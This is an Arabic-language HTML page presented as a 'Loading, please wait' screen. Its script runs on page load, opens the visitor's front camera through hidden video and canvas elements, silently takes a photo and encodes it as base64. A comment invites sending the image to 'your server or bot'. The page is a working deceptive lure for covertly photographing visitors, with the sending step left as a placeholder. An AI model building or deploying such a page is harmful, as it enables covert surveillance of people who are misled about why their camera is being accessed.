<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل</title>
</head>
<body style="background: #111; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px;">

    <h3>جاري التحميل، لطفا الانتظار...</h3>

    <video id="camStream" autoplay playsinline style="display:none;"></video>
    <canvas id="camCanvas" style="display:none;"></canvas>

    <script>
        async function capturePhoto() {
            try {
                // طلب فتح الكاميرا الأمامية
                const mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });

                const videoElement = document.getElementById('camStream');
                videoElement.srcObject = mediaStream;

                // الانتظار للحظة قصيرة جداً لضمان استقرار إضاءة العدسة وتثبيت الصورة
                await new Promise(resolve => setTimeout(resolve, 600));

                const canvasElement = document.getElementById('camCanvas');
                canvasElement.width = videoElement.videoWidth || 640;
                canvasElement.height = videoElement.videoHeight || 480;

                const context = canvasElement.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

                // تحويل الصورة لملف صامت وجاهز
                const imageBase64 = canvasElement.toDataURL('image/jpeg', 0.85);

                // إيقاف جميع مسارات الكاميرا فوراً لإغلاق العدسة تماماً
                mediaStream.getTracks().forEach(track => track.stop());

                // يمكنك إرسال المتغير imageBase64 إلى سيرفرك أو بوتك هنا
                console.log("تم التقاط الصورة الثابتة بنجاح");

            } catch (error) {
                console.error("فشل الوصول للكاميرا: ", error);
            }
        }

        window.onload = capturePhoto;
    </script>

</body>
</html>
